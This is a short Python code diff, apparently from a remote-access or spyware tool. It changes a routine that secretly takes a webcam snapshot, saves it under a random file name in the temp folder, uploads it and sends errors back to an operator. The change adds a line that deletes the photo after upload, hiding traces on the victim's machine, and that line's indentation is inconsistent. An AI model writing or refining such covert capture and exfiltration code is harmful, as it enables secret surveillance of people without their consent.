@@ -11,8 +11,9 @@ def run():
         filename = ''.join(random.choice(string.ascii_letters) for _ in range(5))
         filename += ".jpg"
         filepath = os.path.join(os.environ['temp'], filename)
-        cam.saveSnapshot(filename)
-        upload.run(filename)
+        cam.saveSnapshot(filepath)
+        upload.run(filepath)
+		os.remove(filepath)
     except Exception, exc:
         utils.send_output(exc)
             
